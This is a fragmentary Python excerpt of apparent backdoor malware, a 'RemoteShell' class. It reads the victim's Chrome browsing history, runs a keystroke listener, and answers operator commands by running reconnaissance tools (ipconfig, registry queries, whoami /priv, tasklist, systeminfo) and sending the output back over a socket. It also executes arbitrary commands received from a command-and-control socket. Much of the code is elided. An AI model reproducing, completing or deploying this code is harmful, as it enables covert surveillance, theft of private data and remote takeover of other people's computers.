...
class RemoteShell:
    ...
    def get_browsing_history(self):
        try:
            history_info = run_cmd('sqlite3 "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "SELECT * FROM urls"')
            return history_info
        except Exception as e:
    ...
    def main(self):
        ...
        with connection:
            ...
            with Listener(on_press=self.on_press) as listener:
                while True:
                    try:
                        command = connection.recv(1024).decode("utf-8", errors="ignore")
                        if command.strip().lower() == 'exit':
                            ...
                            network_info = run_cmd('ipconfig /all')
                            connection.send(network_info.encode("utf-8", errors="ignore"))
                        elif command.strip().lower() == 'registry':
                            registry_info = run_cmd('reg query HKCU /f')
                            connection.send(registry_info.encode())
                        elif command.strip().lower() == 'privilege':
                            privilege_info = run_cmd('whoami /priv')
                            connection.send(privilege_info.encode("utf-8", errors="ignore"))
                            ...
                            process_info = run_cmd('tasklist')
                            connection.send(process_info.encode("utf-8", errors="ignore"))
                            ...
                            try:
                                ...
                                c2_command = c2_socket.recv(1024).decode("utf-8", errors="ignore")

                                command_output = self.execute_command(c2_command)
                                c2_socket.send(command_output.encode("utf-8", errors="ignore"))
                            ...
                            escalation_info = run_cmd('whoami /priv')
                            connection.send(escalation_info.encode())

                        elif command.strip().lower() == 'automated_recon':
                            recon_info = run_cmd('systeminfo')
                            connection.send(recon_info.encode("utf-8", errors="ignore"))
                            ...
                            connection.send(output.encode("utf-8", errors="ignore"))
